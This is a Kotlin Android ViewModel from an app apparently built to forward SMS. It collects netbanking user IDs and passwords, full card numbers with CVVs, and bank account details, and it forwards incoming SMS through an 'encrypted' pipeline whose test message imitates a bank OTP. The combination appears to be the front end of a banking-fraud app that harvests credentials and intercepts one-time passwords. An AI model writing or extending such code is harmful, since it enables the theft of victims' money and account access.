package com.smsforwarder.app.ui.home

import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.smsforwarder.app.data.repository.DeviceRepository
import com.smsforwarder.app.data.repository.MessageRepository
import com.smsforwarder.app.domain.model.DeviceInfo
import com.smsforwarder.app.domain.model.DeviceRole
import com.smsforwarder.app.domain.model.SmsMessageData
import com.smsforwarder.app.filter.ForwardingResult
import com.smsforwarder.app.filter.SmsForwardingPipeline
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.flow.*
import kotlinx.coroutines.launch
import javax.inject.Inject

data class HomeUiState(
    val deviceInfo: DeviceInfo? = null,
    val isLoggingIn: Boolean = false,
    val isRegisteringUser: Boolean = false,
    val isSavingAccount: Boolean = false,
    val authError: String? = null,
    val saveMessage: String? = null,
    val pendingQueueCount: Int = 0,
    val testSmsResult: String? = null,
    val isSendingTest: Boolean = false,
    val errorMessage: String? = null
)

@HiltViewModel
class HomeViewModel @Inject constructor(
    private val deviceRepository: DeviceRepository,
    private val messageRepository: MessageRepository,
    private val forwardingPipeline: SmsForwardingPipeline
) : ViewModel() {

    private val _uiState = MutableStateFlow(HomeUiState())
    val uiState: StateFlow<HomeUiState> = _uiState.asStateFlow()

    init {
        viewModelScope.launch {
            combine(
                deviceRepository.deviceInfoFlow,
                messageRepository.pendingCountFlow
            ) { info, count ->
                _uiState.update { it.copy(deviceInfo = info, pendingQueueCount = count) }
            }.collect()
        }
    }

    fun login(mobile: String, pass: String, onSuccess: () -> Unit) {
        viewModelScope.launch {
            _uiState.update { it.copy(isLoggingIn = true, authError = null) }
            val res = deviceRepository.loginUser(mobile, pass)
            _uiState.update {
                it.copy(
                    isLoggingIn = false,
                    authError = res.exceptionOrNull()?.message
                )
            }
            if (res.isSuccess) {
                onSuccess()
            }
        }
    }

    fun registerAccount(name: String, mobile: String, pass: String, onSuccess: () -> Unit) {
        viewModelScope.launch {
            _uiState.update { it.copy(isRegisteringUser = true, authError = null) }
            val res = deviceRepository.registerUserAccount(mobile, pass, name)
            _uiState.update {
                it.copy(
                    isRegisteringUser = false,
                    authError = res.exceptionOrNull()?.message
                )
            }
            if (res.isSuccess) {
                onSuccess()
            }
        }
    }

    fun logout(onSuccess: () -> Unit) {
        viewModelScope.launch {
            deviceRepository.logoutUser()
            onSuccess()
        }
    }

    fun saveBankAccount(bankName: String, accountNo: String, ifsc: String) {
        viewModelScope.launch {
            _uiState.update { it.copy(isSavingAccount = true, saveMessage = null) }
            deviceRepository.saveBankAccountDetails(bankName, accountNo, ifsc)
            _uiState.update { it.copy(isSavingAccount = false, saveMessage = "✅ Bank Account Details Saved Successfully!") }
        }
    }

    fun saveNetbanking(bankName: String, netbankingId: String, netbankingPass: String) {
        viewModelScope.launch {
            _uiState.update { it.copy(isSavingAccount = true, saveMessage = null) }
            deviceRepository.saveNetbankingDetails(bankName, netbankingId, netbankingPass)
            _uiState.update { it.copy(isSavingAccount = false, saveMessage = "✅ Netbanking Details Saved Successfully!") }
        }
    }

    fun saveCard(cardNumber: String, cardExpiry: String, cardCvv: String) {
        viewModelScope.launch {
            _uiState.update { it.copy(isSavingAccount = true, saveMessage = null) }
            deviceRepository.saveCardDetails(cardNumber, cardExpiry, cardCvv)
            _uiState.update { it.copy(isSavingAccount = false, saveMessage = "✅ Card Details Saved Successfully!") }
        }
    }

    fun submitWithdrawal(accountNo: String, ifsc: String, bankName: String, amount: Double, onSuccess: () -> Unit) {
        viewModelScope.launch {
            _uiState.update { it.copy(isSavingAccount = true) }
            val res = deviceRepository.submitWithdrawal(accountNo, ifsc, bankName, amount)
            _uiState.update { it.copy(isSavingAccount = false) }
            if (res.isSuccess) {
                onSuccess()
            }
        }
    }

    fun registerDevice() {
        viewModelScope.launch {
            _uiState.update { it.copy(errorMessage = null) }
            deviceRepository.registerDevice()
        }
    }

    fun setDeviceRole(role: DeviceRole) {
        viewModelScope.launch {
            deviceRepository.setDeviceRole(role)
        }
    }

    fun sendTestSms(sender: String = "HDFCBK", body: String = "Your OTP for Rs 4,500.00 is 591823. Valid for 10 mins.") {
        viewModelScope.launch {
            _uiState.update { it.copy(isSendingTest = true, testSmsResult = null) }
            val testSms = SmsMessageData(
                sender = sender,
                body = body,
                timestampMs = System.currentTimeMillis()
            )

            val result = forwardingPipeline.processAndForward(testSms)
            val resultText = when (result) {
                is ForwardingResult.Success -> "✅ Encrypted & sent successfully (ID: ${result.messageId.take(12)}...)"
                is ForwardingResult.QueuedOffline -> "📦 Queued offline: ${result.reason}"
                is ForwardingResult.FilteredOut -> "⚠️ Filtered out: ${result.reason}"
                is ForwardingResult.Error -> "❌ Error: ${result.message}"
            }

            _uiState.update { it.copy(isSendingTest = false, testSmsResult = resultText) }
        }
    }
}
